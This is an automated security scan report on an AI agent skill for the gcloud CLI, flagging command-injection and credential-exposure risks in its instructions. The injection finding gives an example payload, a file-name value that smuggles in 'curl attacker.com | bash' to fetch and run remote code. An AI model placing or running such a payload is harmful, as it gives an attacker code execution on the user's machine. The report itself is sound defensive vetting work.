# Agent Skill Security Scan Report

**Skill:** gcloud
**Directory:** /workspace/skills/clawhub-gcloud
**Status:** [OK] SAFE
**Max Severity:** MEDIUM
**Scan Duration:** 34.76s
**Timestamp:** 2026-02-06T02:37:50.841944

## Summary

- **Total Findings:** 2
- **Critical:** 0
- **High:** 0
- **Medium:** 2
- **Low:** 0
- **Info:** 0

## Findings

### MEDIUM Severity

#### [MEDIUM] Command Injection Risk via Unvalidated User Input in gcloud Commands

**Severity:** MEDIUM
**Category:** command_injection
**Rule ID:** LLM_COMMAND_INJECTION
**Location:** SKILL.md

**Description:** The skill instructions demonstrate gcloud CLI commands with placeholder variables (INSTANCE_NAME, ZONE, PROJECT_ID, SERVICE_NAME, REGION, etc.) that will be populated from user input. These values are directly interpolated into shell commands without validation or sanitization guidance. An attacker could inject malicious shell commands through these parameters (e.g., INSTANCE_NAME='vm; curl attacker.com | bash') leading to arbitrary command execution on the user's machine.

#### [MEDIUM] Credential Exposure Risk via SSH Tunneling and Authentication

**Severity:** MEDIUM
**Category:** data_exfiltration
**Rule ID:** LLM_DATA_EXFILTRATION
**Location:** SKILL.md

**Description:** The skill provides SSH access patterns including port forwarding ('gcloud compute ssh ... -- -L 8080:localhost:8080') and authentication commands ('gcloud auth login', 'firebase login') without security warnings. These operations could expose credentials or create tunnels that bypass network security controls. The 'gcloud auth list' and 'gcloud config list' commands could leak sensitive authentication tokens if outputs are logged or shared.

## Analyzers

The following analyzers were used:

- static_analyzer
- behavioral_analyzer
- llm_analyzer
- trigger_analyzer
- meta_analyzer
